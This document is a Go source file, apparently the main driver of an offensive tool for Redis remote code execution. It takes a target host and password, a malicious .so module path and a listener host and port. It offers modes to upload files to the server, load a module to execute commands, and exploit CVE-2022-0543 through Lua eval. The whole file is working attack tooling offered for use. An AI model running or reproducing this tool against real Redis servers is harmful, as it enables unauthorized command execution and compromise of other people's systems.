package main

import (
	"flag"
	"fmt"
	"github.com/go-redis/redis/v8"
	"github.com/zyylhn/redis_rce/redisrce"
	"github.com/zyylhn/redis_rce/utils"
	"os"
)
var Uploadfile bool
var Exec bool
var Lua bool
var FilePath string
var ServerPath string
var SoFilePath string
var Password string
var Host string
var Port int
var Lhost string
var Lport int
var Command string

func main() {
	flag.StringVar(&FilePath,"srcpath","","set upload file path")
	flag.StringVar(&ServerPath,"dstpath","","set target path")
	flag.StringVar(&SoFilePath,"so","","set .so file path")
	flag.StringVar(&Password,"pass","","set redis password")
	flag.StringVar(&Host,"host","","set target")
	flag.StringVar(&Command,"command","","Command want to xexc")
	flag.BoolVar(&Uploadfile,"upload",false,"use upload mode")
	flag.BoolVar(&Exec,"exec",false,"use execute the command mode")
	flag.IntVar(&Port,"port",6379,"set redis port")
	flag.StringVar(&Lhost,"lhost","","set listen host(!!!Make sure the target has access!!!)")
	flag.IntVar(&Lport,"lport",20001,"set listen port(!!!Make sure the target has access!!!)")
	flag.BoolVar(&Lua,"lua",false,"use CVE-2022-0543 to attack")
	flag.Parse()
	if Host==""{
		fmt.Println(utils.Red("must set host"))
	}
	redisclient:=redis_client("",Password,Host)
	switch  {
	case Exec:
		if Lhost==""{
			fmt.Println(utils.Red("must set lhost"))
			os.Exit(0)
		}
		redisrce.RdisExec(redisclient,SoFilePath,ServerPath,Lhost,Lport,Command)
	case Uploadfile:
		if FilePath==""||ServerPath==""||Lhost==""{
			fmt.Println(utils.Red("must set lhost,srcpath,dstpath"))
		}
		redisrce.RedisUpload(redisclient,FilePath,ServerPath,Lhost,Lport)
	case Lua:
		redisrce.LuaEval(redisclient,Command)
	default:
		fmt.Println(utils.Red("must set upload or exec"))
	}
}

func redis_client(user,pass,ip string) *redis.Client {
	url:=fmt.Sprintf("redis://%v:%v@%v:%v/",user,pass,ip,Port)
	opt,err:=redis.ParseURL(url)
	if err != nil {
		fmt.Println(utils.Red(err))
	}
	return redis.NewClient(opt)
}